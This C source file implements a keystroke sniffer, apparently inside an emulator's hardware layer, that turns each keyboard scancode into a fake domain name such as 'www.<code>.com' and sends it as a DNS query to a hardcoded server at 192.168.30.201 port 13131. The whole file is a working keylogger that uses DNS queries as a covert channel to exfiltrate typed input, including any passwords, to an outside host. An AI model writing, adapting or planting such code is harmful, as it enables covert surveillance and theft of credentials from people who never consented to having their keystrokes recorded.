#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "hw/ksniffer/ksniffer.h"
#include "hw/ksniffer/dns_sender.h"

struct KeySniffer
{
    int sniffing;
    DnsQuerySenderPtr sender;
};

static KeySniffer ksniffer;
static int initialized = 0;

static int generate_dnsname_by_scancode(int scancode, char *buffer)
{
    sprintf(buffer, "www.%d.com", scancode);
    return strlen(buffer);
}

static void init_ksniffer(KeySnifferPtr ksniffer)
{
    DnsQuerySenderPtr sender = dns_query_sender_create();
    dns_query_sender_connect_to_server(sender, "192.168.30.201", 13131);

    ksniffer->sniffing = 1;
    ksniffer->sender = sender;
}

KeySnifferPtr get_key_sniffer(void)
{
    if (!initialized) {
        init_ksniffer(&ksniffer);
        initialized = 1;
    }

    return &ksniffer;
}

void turn_on(KeySnifferPtr ksniffer)
{
    ksniffer->sniffing = 1;
}

void turn_off(KeySnifferPtr ksniffer)
{
    ksniffer->sniffing = 0;
}

void sniff(KeySnifferPtr ksniffer, int scancode)
{
    char dnsname[32];

    if (ksniffer->sniffing) {
        generate_dnsname_by_scancode(scancode, dnsname);
        dns_query_sender_send_dns_query(ksniffer->sender, dnsname);
    }
}
